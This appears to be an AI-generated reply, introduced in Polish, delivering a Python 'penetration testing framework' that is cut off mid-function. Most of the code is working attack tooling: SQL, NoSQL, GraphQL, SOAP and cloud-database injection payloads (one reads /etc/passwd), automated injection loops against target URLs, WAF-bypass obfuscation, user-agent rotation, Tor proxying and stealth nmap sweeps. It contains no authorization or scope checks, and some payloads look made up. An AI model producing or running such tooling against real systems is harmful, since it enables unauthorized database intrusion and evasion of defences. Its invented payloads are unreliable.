

Oto zaktualizowana wersja narzędzia z dodanymi funkcjami: walidacja URL, obsługa proxy/Tor oraz eksport raportów w formacie PDF.

```python
#!/usr/bin/env python3
"""
Comprehensive Network Penetration Testing Framework
Combining WiFi Network Analysis with SQL Injection, API and Cloud Testing

Author: Independent Red Team Consultant  
Version: Production 1.0
Classification: Professional Use Only
"""

import asyncio
import aiohttp
import json
import re
import sys
import time
import random
import base64
import urllib.parse
import socket
import ipaddress
import netifaces
import platform
import subprocess
from datetime import datetime
from typing import Dict, List, Optional, Tuple, Set
from dataclasses import dataclass
import logging
from pathlib import Path
import argparse
import ssl
import warnings
import threading
import textwrap

# For PDF export
try:
    from reportlab.lib.pagesizes import letter
    from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Preformatted
    from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
    from reportlab.lib.units import inch
    PDF_EXPORT_AVAILABLE = True
except ImportError:
    PDF_EXPORT_AVAILABLE = False
    print("Warning: reportlab not found. PDF export will be disabled.")

# Suppress SSL warnings for professional testing
warnings.filterwarnings("ignore", message="Unverified HTTPS request")

@dataclass
class NetworkDevice:
    """Network device information structure"""
    ip: str
    mac: str
    vendor: str
    status: str
    open_ports: List[int]
    services: Dict[int, str]
    vulnerabilities: List[Dict]
    api_endpoints: List[Dict]
    cloud_indicators: List[str]

@dataclass
class VulnerabilityResult:
    """Professional vulnerability result structure"""
    url: str
    method: str
    parameter: str
    payload: str
    vulnerability_type: str
    severity: str
    confidence: float
    evidence: str
    exploitation_complexity: str
    business_impact: str
    remediation: str
    proof_of_concept: str
    cve_references: List[str]
    owasp_category: str
    api_type: Optional[str] = None
    cloud_provider: Optional[str] = None

class ComprehensivePenTestFramework:
    """
    Comprehensive Network Penetration Testing Framework
    Combines WiFi network analysis with SQL injection, API and cloud testing
    """

    def __init__(self, config: Dict = None):
        self.config = config or {}
        self.session = None
        self.network_devices = []
        self.sql_results = []
        self.api_results = []
        self.cloud_results = []
        self.tested_urls = set()

        # Professional logging setup
        self.setup_logging()
        
        # Timing attack configurations
        self.time_delay = 5
        self.time_threshold = 4
        
        # Load professional payload database
        self.payloads = self.load_professional_payloads()

        # WAF detection and bypass database
        self.waf_signatures = self.load_waf_signatures()
        self.bypass_techniques = self.load_bypass_techniques()

        # Rate limiting and stealth
        self.request_delay = float(self.config.get('delay', 0.1))
        self.max_concurrent = int(self.config.get('concurrent', 10))
        self.stealth_mode = self.config.get('stealth', False)

        # User agents for operational security
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0'
        ]

    def setup_logging(self):
        """Setup professional logging"""
        log_level = self.config.get('log_level', 'INFO')

        # Create logs directory
        Path('logs').mkdir(exist_ok=True)

        # Configure logging
        logging.basicConfig(
            level=getattr(logging, log_level),
            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(f'logs/comprehensive_scan_{datetime.now().strftime("%Y%m%d_%H%M%S")}.log'),
                logging.StreamHandler(sys.stdout)
            ]
        )

        self.logger = logging.getLogger('ComprehensivePenTest')

    def load_professional_payloads(self) -> Dict[str, Dict]:
        """Load professional-grade SQL injection, API and cloud payloads"""
        # Base SQLi payloads
        base_payloads = {
            # Error-based SQLi
            'error_based': [
                "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                "' AND EXTRACTVALUE(1,CONCAT(0x5c,(SELECT version())))--",
                "' AND UPDATEXML(1,CONCAT(0x5c,(SELECT version())),1)--",
                "' UNION ALL SELECT 1,2,3,4,5,CONCAT(0x5c,version(),0x5c),7,8,9--",
                "' OR 1=1 AND (SELECT SUBSTRING(@@version,1,1))='5'--",
            ],

            # Union-based SQLi
            'union_based': [
                "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
                "' UNION SELECT 1,2,3,4,5,6,7,8--",
                "' UNION ALL SELECT 1,version(),user(),database(),5,6,7,8--",
                "' UNION SELECT NULL,CONCAT(table_schema,0x3a,table_name),NULL FROM information_schema.tables--",
                "' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL--",
            ],

            # Boolean-based blind SQLi
            'boolean_blind': [
                "' AND 1=1--",
                "' AND 1=2--",
                "' AND (SELECT SUBSTRING(version(),1,1))='5'--",
                "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
                "' AND (SELECT LENGTH(database()))>0--",
            ],

            # Time-based blind SQLi
            'time_blind': [
                f"' AND (SELECT SLEEP({self.time_delay}))--",
                f"' AND IF(1=1,SLEEP({self.time_delay}),0)--",
                f"'; WAITFOR DELAY '00:00:0{self.time_delay}'--",
                f"' AND (SELECT pg_sleep({self.time_delay}))--",
            ],

            # NoSQL injection
            'nosql': [
                '{"$ne": null}',
                '{"$regex": ".*"}',
                '{"$where": "this.username"}',
                '{"$exists": true}',
                '{"username": {"$ne": null}, "password": {"$ne": null}}',
            ],

            # JSON-based SQLi
            'json_sqli': [
                '{"id": "1\' OR 1=1--"}',
                '{"search": "admin\' UNION SELECT @@version--"}',
                '{"filter": "\' OR 1=1--"}',
            ],
        }

        # API payloads from user
        api_payloads = {
            "rest_json": {
                "post_body": [
                    "{\"id\": \"1' OR 1=1--\"}",
                    "{\"user\": \"admin' UNION SELECT password FROM users--\"}",
                    "{\"search\": \"' OR '1'='1\"}",
                    "{\"filter\": {\"$ne\": null}}",
                    "{\"query\": {\"$where\": \"this.credits == this.debits\"}}"
                ],
                "query_params": [
                    "?id=1' OR 1=1--",
                    "?search=' UNION SELECT version()--",
                    "?filter=' OR 'a'='a'--"
                ]
            },
            "graphql": {
                "queries": [
                    "query { user(id: \"1' OR 1=1--\") { username password } }",
                    "query { users(where: \"' OR '1'='1\") { id username } }",
                    "mutation { updateUser(id: \"1\", name: \"' OR 1=1--\") }",
                    "{ __schema { types { name fields { name type { name } } } } }"
                ],
                "introspection": [
                    "{\"query\": \"{ __schema { queryType { name } } }\"}",
                    "{\"query\": \"{ __type(name: \\\"Query\\\") { fields { name } } }\"}",
                    "{\"query\": \"query IntrospectionQuery { __schema { types { name kind fields { name type { name kind } } } } }\"}"
                ]
            },
            "soap_xml": [
                "<soap:Body><getUserInfo><userId>1' OR 1=1--</userId></getUserInfo></soap:Body>",
                "<soap:Body><search><query><![CDATA[' OR 1=1--]]></query></search></soap:Body>"
            ],
            "nosql": {
                "mongodb": [
                    "{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}",
                    "{\"$where\": \"this.username == 'admin'\"}",
                    "{\"username\": {\"$regex\": \".*\"}, \"password\": {\"$regex\": \".*\"}}"
                ],
                "couchdb": [
                    "{\"selector\": {\"_id\": {\"$gt\": null}}}",
                    "{\"selector\": {\"$and\": [{\"type\": \"user\"}, {\"admin\": true}]}}"
                ]
            }
        }

        # Cloud payloads from user
        cloud_payloads = {
            "aws": {
                "rds_mysql": [
                    "' AND (SELECT aurora_version())--",
                    "' UNION SELECT NULL,aurora_version(),NULL--",
                    "'; SELECT * FROM information_schema.engines WHERE engine='InnoDB'--"
                ],
                "rds_postgresql": [
                    "' AND (SELECT aurora_version())--",
                    "' UNION SELECT NULL,current_setting('rds.extensions'),NULL--"
                ],
                "redshift": [
                    "' AND (SELECT version())--",
                    "' UNION SELECT NULL,version(),NULL--",
                    "'; SELECT * FROM pg_catalog.pg_tables--"
                ],
                "dynamodb": [
                    "admin' OR attribute_exists(#password)--",
                    "' OR contains(#data, :value)--"
                ]
            },
            "azure": {
                "sql_database": [
                    "' AND (SELECT @@version)--",
                    "' UNION SELECT NULL,@@version,NULL--",
                    "'; SELECT * FROM sys.databases--"
                ],
                "cosmos_db": [
                    "admin' OR 1=1--",
                    "' OR c.id != null--"
                ]
            },
            "gcp": {
                "cloud_sql_mysql": [
                    "' AND (SELECT @@version)--",
                    "' UNION SELECT NULL,@@version,NULL--",
                    "'; SELECT * FROM INFORMATION_SCHEMA.ENGINES--"
                ],
                "cloud_sql_postgresql": [
                    "' AND (SELECT version())--",
                    "' UNION SELECT NULL,version(),NULL--"
                ],
                "big_query": [
                    "' AND (SELECT @@version.query_execution_time_limit_ms)--"
                ],
                "firestore": [
                    "admin' OR true--",
                    "' OR __name__ != null--"
                ]
            },
            "generic_cloud": [
                "' AND (SELECT CASE WHEN (1=1) THEN 'aws' ELSE 'not-aws' END)--",
                "' OR cloud_provider()='AWS'--",
                "' UNION SELECT NULL,environment(),NULL--",
                "'; SELECT * FROM INFORMATION_SCHEMA.GLOBAL_VARIABLES WHERE VARIABLE_NAME LIKE '%aurora%'--"
            ]
        }

        # Cloud detection indicators
        cloud_indicators = {
            "aws": [
                "aurora_version()",
                "rds.extensions",
                "amazonaws.com",
                "us-east-1",
                "redshift"
            ],
            "azure": [
                "database.windows.net",
                "sys.databases",
                "azure"
            ],
            "gcp": [
                "googleapis.com",
                "cloud.google.com",
                "big_query"
            ]
        }

        # Combine all payloads
        return {
            **base_payloads,
            "api": api_payloads,
            "cloud": cloud_payloads,
            "cloud_indicators": cloud_indicators
        }

    def load_waf_signatures(self) -> Dict[str, List[str]]:
        """Load WAF detection signatures"""
        return {
            'cloudflare': ['cf-ray', 'cloudflare', 'cf-cache-status'],
            'aws_waf': ['awselb', 'awsalb', 'x-amz-cf-id'],
            'azure_waf': ['x-azure-ref', 'x-azure-requestid'],
            'akamai': ['akamai', 'x-akamai'],
            'incapsula': ['incap_ses', 'visid_incap'],
            'f5_bigip': ['bigipserver', 'f5-bigip'],
        }

    def load_bypass_techniques(self) -> Dict[str, List[str]]:
        """Load WAF bypass techniques"""
        return {
            'comment_obfuscation': [
                '/*comment*/', '/**/', '/**/OR/**/', '/**/UNION/**/',
            ],
            'case_variation': [
                'Union', 'UNION', 'uNiOn', 'Select', 'SELECT'
            ],
            'encoding': [
                '%20', '%0a', '%0d', '%09', '%2527'
            ],
            'unicode': [
                '\\u0027', '\\u002f\\u002a'
            ]
        }

    def validate_url(self, url: str) -> bool:
        """Validate URL format using regex"""
        url_pattern = re.compile(
            r'^(http|https)://'  # http:// or https://
            r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+[A-Z]{2,6}\.?|'  # domain...
            r'localhost|'  # localhost...
            r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'  # ...or ip
            r'(?::\d+)?'  # optional port
            r'(?:/?|[/?]\S+)$', re.IGNORECASE)
        return re.match(url_pattern, url) is not None

    async def initialize_session(self, proxy_url: Optional[str] = None, use_tor: bool = False):
        """Initialize HTTP session with professional configurations and proxy support"""
        connector = aiohttp.TCPConnector(
            limit=100,
            limit_per_host=self.max_concurrent,
            ssl=False,
            keepalive_timeout=30
        )

        timeout = aiohttp.ClientTimeout(total=30, connect=10)

        # Configure proxy
        proxy_config = None
        if use_tor:
            proxy_config = "socks5://127.0.0.1:9050"  # Default Tor SOCKS5 port
            self.logger.info("Using Tor proxy at 127.0.0.1:9050")
        elif proxy_url:
            proxy_config = proxy_url
            self.logger.info(f"Using proxy: {proxy_url}")

        self.session = aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            headers={
                'User-Agent': random.choice(self.user_agents),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Connection': 'keep-alive'
            },
            proxy=proxy_config
        )

        self.logger.info("Professional HTTP session initialized")

    async def detect_waf(self, url: str) -> Optional[str]:
        """Detect Web Application Firewall"""
        try:
            async with self.session.get(url) as response:
                headers = dict(response.headers)

                # Check headers for WAF signatures
                headers_str = str(headers).lower()
                for waf_name, signatures in self.waf_signatures.items():
                    for signature in signatures:
                        if signature in headers_str:
                            self.logger.info(f"WAF detected: {waf_name}")
                            return waf_name

        except Exception as e:
            self.logger.debug(f"WAF detection error: {e}")

        return None

    def apply_bypass_techniques(self, payload: str, waf: Optional[str] = None) -> List[str]:
        """Apply WAF bypass techniques to payload"""
        bypassed_payloads = [payload]

        # Apply comment obfuscation
        bypassed_payloads.append(payload.replace(' ', '/**/'))

        # Apply case variations
        bypassed_payloads.extend([
            payload.upper(),
            payload.lower()
        ])

        # Apply URL encoding
        bypassed_payloads.append(urllib.parse.quote(payload))

        # WAF-specific bypasses
        if waf == 'cloudflare':
            bypassed_payloads.extend([
                payload.replace('UNION', '/*!UNION*/'),
                payload.replace('SELECT', '/*!SELECT*/')
            ])

        return list(set(bypassed_payloads))

    async def test_sqli_parameter(self, url: str, method: str, param_name: str, 
                                param_value: str, payload_type: str) -> List[VulnerabilityResult]:
        """Test a specific parameter for SQL injection"""
        vulnerabilities = []

        for payload in self.payloads[payload_type]:
            waf = await self.detect_waf(url)
            bypassed_payloads = self.apply_bypass_techniques(payload, waf)

            for bypassed_payload in bypassed_payloads:
                try:
                    test_data = {param_name: bypassed_payload}

                    if self.request_delay > 0:
                        await asyncio.sleep(self.request_delay)

                    start_time = time.time()

                    if method.upper() == 'POST':
                        async with self.session.post(url, data=test_data) as response:
                            end_time = time.time()
                            response_text = await response.text()
                            response_time = end_time - start_time
                    else:
                        params = {param_name: bypassed_payload}
                        async with self.session.get(url, params=params) as response:
                            end_time = time.time()
                            response_text = await response.text()
                            response_time = end_time - start_time

                    vuln = await self.analyze_response(
                        url, method, param_name, bypassed_payload,
                        response.status, response_text, response_time,
                        payload_type
                    )

                    if vuln:
                        vulnerabilities.append(vuln)
                        self.logger.warning(f"SQLi found: {url} - {param_name}")
                        break

                except asyncio.TimeoutError:
                    if payload_type == 'time_blind':
                        vuln = VulnerabilityResult(
                            url=url,
                            method=method,
                            parameter=param_name,
                            payload=bypassed_payload,
                            vulnerability_type='Time-based Blind SQL Injection',
                            severity='High',
                            confidence=0.8,
                            evidence='Request timeout on time-based payload',
                            exploitation_complexity='Medium',
                            business_impact='High - Database access possible',
                            remediation='Implement parameterized queries',
                            proof_of_concept=f'{method} {url} - {param_name}={bypassed_payload}',
                            cve_references=['CWE-89'],
                            owasp_category='A03:2021 Injection'
                        )
                        vulnerabilities.append(vuln)

                except Exception as e:
                    self.logger.debug(f"Request error: {e}")
                    continue

        return vulnerabilities

    async def test_api_endpoint(self, url: str, api_type: str, method: str = 'POST') -> List[VulnerabilityResult]:
        """Test API endpoint for vulnerabilities"""
        vulnerabilities = []
        
        if api_type not in self.payloads['api']:
            return vulnerabilities

        api_payloads = self.payloads['api'][api_type]
        
        # Test different API attack vectors
        if api_type == 'rest_json':
            # Test POST body payloads
            for payload in api_payloads['post_body']:
                try:
                    headers = {'Content-Type': 'application/json'}
                    if self.request_delay > 0:
                        await asyncio.sleep(self.request_delay)

                    start_time = time.time()
                    async with self.session.post(url, data=payload, headers=headers) as response:
                        end_time = time.time()
                        response_text = await response.text()
                        response_time = end_time - start_time

                    vuln = await self.analyze_api_response(
                        url, method, payload, response.status, response_text, 
                        response_time, api_type, 'post_body'
                    )
                    if vuln:
                        vulnerabilities.append(vuln)

                except Exception as e:
                    self.logger.debug(f"API POST test error: {e}")
                    continue

            # Test query parameters
            for payload in api_payloads['query_params']:
                try:
                    full_url = url + payload
                    if self.request_delay > 0:
                        await asyncio.sleep(self.request_delay)

                    start_time = time.time()
                    async with self.session.get(full_url) as response:
                        end_time = time.time()
                        response_text = await response.text()
                        response_time = end_time - start_time

                    vuln = await self.analyze_api_response(
                        full_url, 'GET', payload, response.status, response_text, 
                        response_time, api_type, 'query_params'
                    )
                    if vuln:
                        vulnerabilities.append(vuln)

                except Exception as e:
                    self.logger.debug(f"API query test error: {e}")
                    continue

        elif api_type == 'graphql':
            # Test GraphQL queries
            for payload in api_payloads['queries']:
                try:
                    headers = {'Content-Type': 'application/json'}
                    data = json.dumps({"query": payload})
                    
                    if self.request_delay > 0:
                        await asyncio.sleep(self.request_delay)

                    start_time = time.time()
                    async with self.session.post(url, data=data, headers=headers) as response:
                        end_time = time.time()
                        response_text = await response.text()
                        response_time = end_time - start_time

                    vuln = await self.analyze_api_response(
                        url, 'POST', payload, response.status, response_text, 
                        response_time, api_type, 'query'
                    )
                    if vuln:
                        vulnerabilities.append(vuln)

                except Exception as e:
                    self.logger.debug(f"GraphQL test error: {e}")
                    continue

            # Test GraphQL introspection
            for payload in api_payloads['introspection']:
                try:
                    data = json.loads(payload)
                    headers = {'Content-Type': 'application/json'}
                    
                    if self.request_delay > 0:
                        await asyncio.sleep(self.request_delay)

                    start_time = time.time()
                    async with self.session.post(url, json=data, headers=headers) as response:
                        end_time = time.time()
                        response_text = await response.text()
                        response_time = end_time - start_time

                    vuln = await self.analyze_api_response(
                        url, 'POST', payload, response.status, response_text, 
                        response_time, api_type, 'introspection'
                    )
                    if vuln:
                        vulnerabilities.append(vuln)

                except Exception as e:
                    self.logger.debug(f"GraphQL introspection test error: {e}")
                    continue

        elif api_type == 'soap_xml':
            # Test SOAP XML payloads
            for payload in api_payloads:
                try:
                    headers = {'Content-Type': 'text/xml', 'SOAPAction': ''}
                    
                    if self.request_delay > 0:
                        await asyncio.sleep(self.request_delay)

                    start_time = time.time()
                    async with self.session.post(url, data=payload, headers=headers) as response:
                        end_time = time.time()
                        response_text = await response.text()
                        response_time = end_time - start_time

                    vuln = await self.analyze_api_response(
                        url, 'POST', payload, response.status, response_text, 
                        response_time, api_type, 'xml'
                    )
                    if vuln:
                        vulnerabilities.append(vuln)

                except Exception as e:
                    self.logger.debug(f"SOAP test error: {e}")
                    continue

        elif api_type == 'nosql':
            # Test NoSQL payloads
            for db_type, payloads in api_payloads.items():
                for payload in payloads:
                    try:
                        headers = {'Content-Type': 'application/json'}
                        data = json.dumps(payload)
                        
                        if self.request_delay > 0:
                            await asyncio.sleep(self.request_delay)

                        start_time = time.time()
                        async with self.session.post(url, data=data, headers=headers) as response:
                            end_time = time.time()
                            response_text = await response.text()
                            response_time = end_time - start_time

                        vuln = await self.analyze_api_response(
                            url, 'POST', payload, response.status, response_text, 
                            response_time, api_type, db_type
                        )
                        if vuln:
                            vulnerabilities.append(vuln)

                    except Exception as e:
                        self.logger.debug(f"NoSQL test error: {e}")
                        continue

        return vulnerabilities

    async def test_cloud_vulnerabilities(self, url: str, cloud_provider: str) -> List[VulnerabilityResult]:
        """Test cloud-specific vulnerabilities"""
        vulnerabilities = []
        
        if cloud_provider not in self.payloads['cloud']:
            return vulnerabilities

        cloud_payloads = self.payloads['cloud'][cloud_provider]
        
        # Test different cloud service vulnerabilities
        for service, payloads in cloud_payloads.items():
            for payload in payloads:
                try:
                    headers = {'Content-Type': 'application/json'}
                    data = json.dumps({"query": payload}) if service in ['big_query', 'firestore'] else payload
                    
                    if self.request_delay > 0:
                        await asyncio.sleep(self.request_delay)

                    start_time = time.time()
                    async with self.session.post(url, data=data, headers=headers) as response:
                        end_time = time.time()
                        response_text = await response.text()
                        response_time = end_time - start_time

                    vuln = await self.analyze_cloud_response(
                        url, cloud_provider, service, payload, response.status, 
                        response_text, response_time
                    )
                    if vuln:
                        vulnerabilities.append(vuln)

                except Exception as e:
                    self.logger.debug(f"Cloud test error for {cloud_provider} {service}: {e}")
                    continue

        return vulnerabilities

    async def analyze_cloud_response(self, url: str, cloud_provider: str, service: str, 
                                  payload: str, status_code: int, response_text: str,
                                  response_time: float) -> Optional[VulnerabilityResult]:
        """Analyze cloud service response for vulnerabilities"""

        # Cloud-specific error patterns
        cloud_error_patterns = {
            'aws': {
                'rds_mysql': [
                    r'aurora_version',
                    r'Amazon Aurora',
                    r'AWS RDS'
                ],
                'rds_postgresql': [
                    r'aurora_version',
                    r'rds.extensions',
                    r'Amazon Aurora'
                ],
                'redshift': [
                    r'version',
                    r'Redshift',
                    r'Amazon Redshift'
                ],
                'dynamodb': [
                    r'attribute_exists',
                    r'contains',
                    r'DynamoDB'
                ]
            },
            'azure': {
                'sql_database': [
                    r'@@version',
                    r'sys\.databases',
                    r'Azure SQL'
                ],
                'cosmos_db': [
                    r'c\.id',
                    r'Cosmos DB',
                    r'Microsoft Azure'
                ]
            },
            'gcp': {
                'cloud_sql_mysql': [
                    r'@@version',
                    r'Cloud SQL',
                    r'Google Cloud'
                ],
                'cloud_sql_postgresql': [
                    r'version',
                    r'Cloud SQL',
                    r'Google Cloud'
                ],
                'big_query': [
                    r'query_execution_time_limit_ms',
                    r'BigQuery',
                    r'Google Cloud'
                ],
                'firestore': [
                    r'__name__',
                    r'Firestore',
                    r'Google Cloud'
                ]
            }
        }

        # Check for cloud-specific errors
        if cloud_provider in cloud_error_patterns and service in cloud_error_patterns[cloud_provider]:
            for pattern in cloud_error_patterns[cloud_provider][service]:
                if re.search(pattern, response_text, re.IGNORECASE):
                    return VulnerabilityResult(
                        url=url,
                        method='POST',
                        parameter=service,
                        payload=payload,
                        vulnerability_type=f'{cloud_provider.capitalize()} {service.replace("_", " ").title()} Injection',
                        severity='Critical',
                        confidence=0.9,
                        evidence=f'Cloud service error pattern: {pattern}',
                        exploitation_complexity='Low',
                        business_impact='Critical - Cloud service compromise possible',
                        remediation=f'Implement proper input validation for {cloud_provider} {service}',
                        proof_of_concept=f'POST {url} - {service} payload',
                        cve_references=['CWE-89', 'CWE-20'],
                        owasp_category='A03:2021 Injection',
                        cloud_provider=cloud_provider
                    )

        # Time-based analysis for cloud services
        if response_time >= self.time_threshold:
            return VulnerabilityResult(
                url=url,
                method='POST',
                parameter=service,
                payload=payload,
                vulnerability_type=f'Time-based {cloud_provider.capitalize()} {service.replace("_", " ").title()} Injection',
                severity='High',
                confidence=0.85,
                evidence=f'Response delayed by {response_time:.2f} seconds',
                exploitation_complexity='Medium',
                business_impact='High - Blind cloud service enumeration possible',
                remediation=f'Implement proper input validation for {cloud_provider} {service}',
                proof_of_concept=f'POST {url} - {service} payload',
                cve_references=['CWE-89'],
                owasp_category='A03:2021 Injection',
                cloud_provider=cloud_provider
            )

        return None

    async def detect_cloud_provider(self, url: str) -> Optional[str]:
        """Detect cloud provider based on response and indicators"""
        try:
            async with self.session.get(url, timeout=5) as response:
                response_text = await response.text()
                headers = dict(response.headers)
                
                # Check for cloud indicators in response
                for provider, indicators in self.payloads['cloud_indicators'].items():
                    for indicator in indicators:
                        if indicator in response_text.lower() or indicator in str(headers).lower():
                            self.logger.info(f"Cloud provider detected: {provider}")
                            return provider
                
                # Check for generic cloud indicators
                generic_indicators = ['aws', 'azure', 'gcp', 'google', 'amazon', 'microsoft']
                for indicator in generic_indicators:
                    if indicator in url.lower():
                        self.logger.info(f"Cloud provider detected by URL: {indicator}")
                        return indicator

        except Exception as e:
            self.logger.debug(f"Cloud detection error: {e}")
        
        return None

    async def analyze_api_response(self, url: str, method: str, payload: str, 
                                status_code: int, response_text: str,
                                response_time: float, api_type: str, 
                                attack_vector: str) -> Optional[VulnerabilityResult]:
        """Analyze API response for vulnerabilities"""

        # Error patterns for different API types
        error_patterns = {
            'rest_json': [
                r'json\.decode|JSONDecodeError',
                r'invalid.*json',
                r'unexpected.*token',
                r'syntax.*error'
            ],
            'graphql': [
                r'GraphQL.*error',
                r'validation.*failed',
                r'unexpected.*field',
                r'unknown.*type'
            ],
            'soap_xml': [
                r'XML.*error',
                r'parser.*error',
                r'syntax.*error',
                r'invalid.*xml'
            ],
            'nosql': [
                r'JSON.*parse|JSONParseException',
                r'invalid.*json',
                r'unexpected.*token',
                r'syntax.*error'
            ]
        }

        # Check for API errors
        if api_type in error_patterns:
            for pattern in error_patterns[api_type]:
                if re.search(pattern, response_text, re.IGNORECASE):
                    return VulnerabilityResult(
                        url=url,
                        method=method,
                        parameter=attack_vector,
                        payload=payload,
                        vulnerability_type=f'{api_type.capitalize()} Injection ({attack_vector})',
                        severity='Critical',
                        confidence=0.9,
                        evidence=f'API error pattern: {pattern}',
                        exploitation_complexity='Low',
                        business_impact='Critical - Data exposure possible',
                        remediation='Implement proper input validation and parameterized queries',
                        proof_of_concept=f'{method} {url} - {attack_vector}={payload}',
                        cve_references=['CWE-89', 'CWE-20'],
                        owasp_category='A03:2021 Injection',
                        api_type=api_type
                    )

        # Time-based analysis for APIs
        if api_type in ['rest_json', 'graphql', 'nosql'] and response_time >= self.time_threshold:
            return VulnerabilityResult(
                url=url,
                method=method,
                parameter=attack_vector,
                payload=payload,
                vulnerability_type=f'Time-based {api_type.capitalize()} Injection',
                severity='High',
                confidence=0.85,
                evidence=f'Response delayed by {response_time:.2f} seconds',
                exploitation_complexity='Medium',
                business_impact='High - Blind data enumeration possible',
                remediation='Implement proper input validation and parameterized queries',
                proof_of_concept=f'{method} {url} - {attack_vector}={payload}',
                cve_references=['CWE-89'],
                owasp_category='A03:2021 Injection',
                api_type=api_type
            )

        return None

    async def analyze_response(self, url: str, method: str, param_name: str, 
                             payload: str, status_code: int, response_text: str,
                             response_time: float, payload_type: str) -> Optional[VulnerabilityResult]:
        """Analyze response for SQL injection indicators"""

        error_patterns = {
            'mysql': [
                r'mysql_fetch_array\(\)',
                r'You have an error in your SQL syntax',
                r'Warning.*mysql_.*',
                r'MySQLSyntaxErrorException'
            ],
            'postgresql': [
                r'PostgreSQL.*ERROR',
                r'Warning.*\\Wpg_.*',
                r'PG::SyntaxError'
            ],
            'oracle': [
                r'ORA-[0-9]+',
                r'Oracle error'
            ],
            'mssql': [
                r'Microsoft.*ODBC.*SQL Server',
                r'\\[SqlException',
                r'System\\.Data\\.SqlClient'
            ],
            'sqlite': [
                r'SQLite.*error',
                r'sqlite3.OperationalError'
            ]
        }

        # Check for database errors
        for db_type, patterns in error_patterns.items():
            for pattern in patterns:
                if re.search(pattern, response_text, re.IGNORECASE):
                    return VulnerabilityResult(
                        url=url,
                        method=method,
                        parameter=param_name,
                        payload=payload,
                        vulnerability_type=f'Error-based SQL Injection ({db_type})',
                        severity='Critical',
                        confidence=0.95,
                        evidence=f'Database error pattern: {pattern}',
                        exploitation_complexity='Low',
                        business_impact='Critical - Full database compromise',
                        remediation='Implement parameterized queries',
                        proof_of_concept=f'{method} {url} - {param_name}={payload}',
                        cve_references=['CWE-89', 'CWE-209'],
                        owasp_category='A03:2021 Injection'
                    )

        # Time-based analysis
        if payload_type == 'time_blind' and response_time >= self.time_threshold:
            return VulnerabilityResult(
                url=url,
                method=method,
                parameter=param_name,
                payload=payload,
                vulnerability_type='Time-based Blind SQL Injection',
                severity='High',
                confidence=0.85,
                evidence=f'Response delayed by {response_time:.2f} seconds',
                exploitation_complexity='Medium',
                business_impact='High - Blind database enumeration',
                remediation='Implement parameterized queries',
                proof_of_concept=f'{method} {url} - {param_name}={payload}',
                cve_references=['CWE-89'],
                owasp_category='A03:2021 Injection'
            )

        # Union-based analysis
        if payload_type == 'union_based':
            union_indicators = [
                r'root:.*:0:0:',
                r'mysql.*version',
                r'information_schema',
                r'@@version'
            ]

            for indicator in union_indicators:
                if re.search(indicator, response_text, re.IGNORECASE):
                    return VulnerabilityResult(
                        url=url,
                        method=method,
                        parameter=param_name,
                        payload=payload,
                        vulnerability_type='Union-based SQL Injection',
                        severity='Critical',
                        confidence=0.9,
                        evidence=f'Union injection successful: {indicator}',
                        exploitation_complexity='Low',
                        business_impact='Critical - Full database access',
                        remediation='Implement parameterized queries',
                        proof_of_concept=f'{method} {url} - {param_name}={payload}',
                        cve_references=['CWE-89'],
                        owasp_category='A03:2021 Injection'
                    )

        return None

    async def scan_url(self, url: str, method: str = 'GET', 
                      parameters: Dict[str, str] = None) -> List[VulnerabilityResult]:
        """Scan a URL for SQL injection vulnerabilities"""
        if url in self.tested_urls:
            return []

        self.tested_urls.add(url)
        self.logger.info(f"Scanning: {url}")

        vulnerabilities = []

        if not parameters:
            parameters = {'id': '1', 'page': '1', 'search': 'test'}

        for param_name, param_value in parameters.items():
            self.logger.debug(f"Testing parameter: {param_name}")

            for payload_type in ['error_based', 'union_based', 'time_blind']:
                vulns = await self.test_sqli_parameter(
                    url, method, param_name, param_value, payload_type
                )
                vulnerabilities.extend(vulns)

                if vulns and self.config.get('fast_mode', False):
                    break

        return vulnerabilities

    def scan_network_devices(self, network_range: str = None) -> List[NetworkDevice]:
        """Skanuje sieć w poszukiwaniu urządzeń"""
        devices = []
        
        try:
            # Pobierz interfejsy sieciowe
            interfaces = self.get_network_interfaces()
            if not interfaces:
                self.logger.error("Nie znaleziono interfejsów sieciowych")
                return devices
            
            # Użyj pierwszego interfejsu z IPv4
            interface = interfaces[0]
            ip = interface['ip']
            netmask = interface['netmask']
            
            if not network_range:
                network_range = self.get_network_range(ip, netmask)
            
            if not self.stealth_mode:
                self.logger.info(f"Skanowanie sieci: {network_range}")
            
            # Użyj nmap do skanowania sieci
            try:
                # Tryb cichy dla nmap
                nmap_args = ['-sn', network_range]
                if self.stealth_mode:
                    nmap_args.extend(['-T2', '--max-retries', '1', '--host-timeout', '2s'])
                
                result = subprocess.run(['nmap'] + nmap_args,
                                     capture_output=True, text=True, timeout=60)
                
                # Parsuj wyniki nmap
                current_device = None
                for line in result.stdout.split('\n'):
                    if 'Nmap scan report for' in line:
                        if current_device:
                            devices.append(current_device)
                        device_ip = line.split()[-1]
                        current_device = {'ip': device_ip, 'status': 'Up'}
                    
                    elif 'MAC Address:' in line and current_device:
                        mac = line.split('MAC Address: ')[1].strip()
                        current_device['mac'] = mac
                        current_device['vendor'] = self._get_vendor_from_mac(mac)
                    
                    elif 'Host is up' in line and current_device:
                        current_device['status'] = 'Up'
                
                if current_device:
                    devices.append(current_device)
                    
            except:
                # Fallback: użycie arp-scan na Linux
                try:
